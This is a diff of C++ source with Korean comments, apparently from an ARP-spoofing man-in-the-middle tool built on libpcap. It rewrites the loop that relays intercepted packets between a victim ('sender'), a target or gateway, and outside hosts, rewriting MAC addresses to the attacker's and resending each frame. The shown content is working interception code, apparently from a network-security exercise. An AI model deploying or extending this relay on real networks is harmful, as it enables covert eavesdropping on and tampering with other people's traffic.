@@ -211,47 +211,45 @@ int main(int argc, char* argv[]) {
             IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));
         
             for (auto& conn : connections) {
-                bool relayed = false;
+                // [1] sender → target
+                if (ip->sip() == conn.sender_ip &&
+                    ip->dip() == conn.target_ip) {
+                    EthHdr* eth_hdr = (EthHdr*)packet;
+                    eth_hdr->smac_ = Mac(attacker_mac);
+                    eth_hdr->dmac_ = conn.target_mac;
+                    pcap_sendpacket(handle, packet, header->caplen);
+                }
         
-                // 1. sender → target
-                if (ip->sip() == conn.sender_ip && ip->dip() == conn.target_ip) {
-                    EthHdr* relay_eth = (EthHdr*)packet;
-                    relay_eth->smac_ = Mac(attacker_mac);
-                    relay_eth->dmac_ = conn.target_mac;
+                // [2] target → sender
+                else if (ip->sip() == conn.target_ip &&
+                         ip->dip() == conn.sender_ip) {
+                    EthHdr* eth_hdr = (EthHdr*)packet;
+                    eth_hdr->smac_ = Mac(attacker_mac);
+                    eth_hdr->dmac_ = conn.sender_mac;
                     pcap_sendpacket(handle, packet, header->caplen);
-                    relayed = true;
                 }
-                // 2. target → sender
-                else if (ip->sip() == conn.target_ip && ip->dip() == conn.sender_ip) {
-                    EthHdr* relay_eth = (EthHdr*)packet;
-                    relay_eth->smac_ = Mac(attacker_mac);
-                    relay_eth->dmac_ = conn.sender_mac;
-                    pcap_sendpacket(handle, packet, header->caplen);
-                    relayed = true;
-                }
-                // 3. sender → outside (my_ip, target 제외)
+        
+                // [3] sender → 외부
                 else if (ip->sip() == conn.sender_ip &&
                          ip->dip() != conn.target_ip &&
                          ip->dip() != Ip(attacker_ip)) {
-                    EthHdr* relay_eth = (EthHdr*)packet;
-                    relay_eth->smac_ = Mac(attacker_mac);
-                    relay_eth->dmac_ = conn.target_mac;
+                    EthHdr* eth_hdr = (EthHdr*)packet;
+                    eth_hdr->smac_ = Mac(attacker_mac);
+                    eth_hdr->dmac_ = conn.target_mac;  // 게이트웨이에게 보냄
                     pcap_sendpacket(handle, packet, header->caplen);
-                    relayed = true;
-                }
-                // 4. outside → sender
-                else if (ip->dip() == conn.sender_ip &&
-                         ip->sip() != conn.target_ip) {
-                    EthHdr* relay_eth = (EthHdr*)packet;
-                    relay_eth->smac_ = Mac(attacker_mac);
-                    relay_eth->dmac_ = conn.sender_mac;
-                    pcap_sendpacket(handle, packet, header->caplen);
-                    relayed = true;
                 }
         
-                if (relayed) break; // 하나 relayed 됐으면 루프 빠져도 OK
+                // ✅ [4] 외부 → sender (이게 없으면 응답 안 보임!!)
+                else if (ip->dip() == conn.sender_ip &&
+                         ip->sip() != conn.target_ip) {
+                    EthHdr* eth_hdr = (EthHdr*)packet;
+                    eth_hdr->smac_ = Mac(attacker_mac);
+                    eth_hdr->dmac_ = conn.sender_mac;
+                    pcap_sendpacket(handle, packet, header->caplen);
+                }
             }
         }
+
 
         else if (ntohs(eth->type_) == EthHdr::Arp) {
             ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
